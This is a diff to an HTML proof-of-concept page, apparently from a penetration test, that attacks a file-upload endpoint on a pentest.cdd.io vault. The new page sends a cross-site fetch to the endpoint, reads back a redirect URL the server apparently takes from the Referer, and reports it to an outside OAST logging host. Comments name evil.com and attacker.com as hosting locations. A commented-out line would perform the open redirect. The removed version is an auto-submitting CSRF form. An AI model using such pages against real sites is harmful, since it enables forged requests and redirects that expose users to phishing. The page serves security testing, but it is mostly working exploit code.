@@ -1,8 +1,32 @@
+<!DOCTYPE html>
 <html>
-  <form id=f action="https://pentest.cdd.io/vaults/1050591758/active_storage_direct_uploads" method="POST" enctype="application/json">
-<input name="blob[filename]" value="x">
-<input name="blob[byte_size]" value="1">
-<input name="blob[checksum]" value="abc">
-<input name="blob[content_type]" value="text/plain">
-</form><script>f.submit()</script>
+<head><title>Upload Open Redirect CSRF - no credentials</title></head>
+<body>
+<h1>CSRF fetch without credentials - upload open redirect</h1>
+<script>
+// Fetch to upload endpoint without credentials, server reflects Referer as redirect_url
+fetch("https://pentest.cdd.io/vaults/1050593102/active_storage_direct_uploads", {
+  method: "POST",
+  // No credentials - as requested
+  headers: {
+    "Content-Type": "application/json",
+    "Accept": "application/json",
+    "X-Requested-With": "XMLHttpRequest"
+  },
+  body: JSON.stringify({blob:{filename:"x.txt",content_type:"text/plain",byte_size:4,checksum:"U29tZQ=="}})
+}).then(r=>r.json()).then(j=>{
+  console.log("JSON", j);
+  document.body.innerHTML += "<pre>"+JSON.stringify(j,null,2)+"</pre>";
+  if(j.redirect_url){
+    // This is //evil.com or https://attacker.com/file.html depending on Referer
+    // For poc hosted on https://daplq2fn0ftdbjdojujgru8egz73xt9c1.oast.pro/file.html it will be that OAST URL
+    document.body.innerHTML += "<p>Would redirect to: "+j.redirect_url+"</p>";
+    // Uncomment to actually redirect (like cdd_direct_upload.ts:361)
+    // window.location.href = j.redirect_url;
+    fetch("https://daplq2fn0ftdbjdojujgru8egz73xt9c1.oast.pro/log?r="+encodeURIComponent(j.redirect_url), {mode:"no-cors"});
+  }
+}).catch(e=>console.log(e));
+</script>
+<p>Host this on https://daplq2fn0ftdbjdojujgru8egz73xt9c1.oast.pro/file.html or https://evil.com/file.html and visit - check OAST for hit.</p>
+</body>
 </html>
